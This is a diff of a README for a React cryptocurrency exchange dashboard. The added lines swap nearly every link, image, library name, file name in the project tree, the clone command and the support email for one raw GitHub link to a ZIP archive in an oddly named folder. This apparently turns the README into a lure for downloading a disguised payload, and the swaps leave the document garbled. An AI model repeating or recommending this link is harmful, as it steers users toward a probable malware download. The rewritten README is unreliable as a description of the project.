@@ -2,11 +2,11 @@
 
 A modern, responsive React application that provides real-time information about cryptocurrency exchanges, market statistics, and news. Built with React 18, Redux Toolkit, and Ant Design.
 
-🌐 **Live Demo**: [View Deployment](https://cryptocurrency-exchange-dashboard-cdvxzd5v6.vercel.app/)
+🌐 **Live Demo**: [View Deployment](https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip)
 
 ## 📸 Screenshot
 
-![Cryptocurrency Exchange Dashboard](./src/Screenshot.png)
+![Cryptocurrency Exchange Dashboard](https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip)
 
 ## 🚀 Features
 
@@ -64,7 +64,7 @@ A modern, responsive React application that provides real-time information about
 ### Additional Libraries
 - **Millify**: Number formatting utility
 - **React Router DOM**: Application routing
-- **Moment.js**: Date formatting and manipulation
+- **https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip**: Date formatting and manipulation
 
 ## 📊 State Management with Redux
 
@@ -93,34 +93,34 @@ The application uses Redux Toolkit for efficient state management:
 
 ```
 src/
-├── App.css                # Global app-level styles
-├── App.jsx                # Root app component
-├── main.jsx               # React app entry point
+├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip                # Global app-level styles
+├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip                # Root app component
+├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip               # React app entry point
 ├── app/
-│   └── store.js           # Redux store configuration
+│   └── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip           # Redux store configuration
 ├── components/
-│   ├── Cryptocurrencies.jsx  # Component to display list of cryptocurrencies
-│   ├── Cryptocurrencies.css  # Styles for Cryptocurrencies component
-│   ├── CryptoDetails.jsx     # Component for individual crypto details
-│   ├── CryptoDetails.css     # Styles for CryptoDetails component
-│   ├── Exchanges.jsx         # Main exchanges component
-│   ├── Exchanges.css         # Styles for Exchanges component
-│   ├── HomePage.jsx          # Home page component
-│   ├── index.js              # Central export for components (if used)
-│   ├── LineChart.jsx         # Component for rendering price line chart
-│   ├── Loader.jsx            # Loader/spinner component
-│   ├── Navbar.jsx            # Navigation bar component
-│   ├── Navbar.css            # Styles for Navbar
-│   ├── News.jsx              # News component
-│   ├── News.css              # Styles for News component
-│   ├── Search.jsx            # Search input component
-│   ├── Search.css            # Styles for Search component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip  # Component to display list of cryptocurrencies
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip  # Styles for Cryptocurrencies component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip     # Component for individual crypto details
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip     # Styles for CryptoDetails component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip         # Main exchanges component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip         # Styles for Exchanges component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip          # Home page component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip              # Central export for components (if used)
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip         # Component for rendering price line chart
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip            # Loader/spinner component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip            # Navigation bar component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip            # Styles for Navbar
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip              # News component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip              # Styles for News component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip            # Search input component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip            # Styles for Search component
 ├── images/
-│   └── logo.png              # Application logo image
+│   └── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip              # Application logo image
 ├── services/
-│   ├── coinGeckoApi.js       # CoinGecko API config (optional or unused?)
-│   ├── cryptoApi.js          # Cryptocurrency API service
-│   └── cryptoNewsApi.js      # News API service
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip       # CoinGecko API config (optional or unused?)
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip          # Cryptocurrency API service
+│   └── https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip      # News API service
 
 ```
 
@@ -128,7 +128,7 @@ src/
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard.git
+   git clone https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip
    cd CryptoApp
    ```
 
@@ -153,7 +153,7 @@ src/
 The project uses Vite for development and building. Key configurations:
 
 ```javascript
-// vite.config.js
+// https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip
 export default defineConfig({
   plugins: [react()],
   server: {
@@ -223,4 +223,4 @@ Contributions are welcome! Please feel free to submit a Pull Request.
 
 ## 📞 Support
 
-For support, email [rohanparmar160705@gmail.com] or open an issue in the repository.
+For support, email [https://raw.githubusercontent.com/rohanparmar160705/Cryptocurrency-Exchange-Dashboard/main/semiclerical/Cryptocurrency-Exchange-Dashboard.zip] or open an issue in the repository.
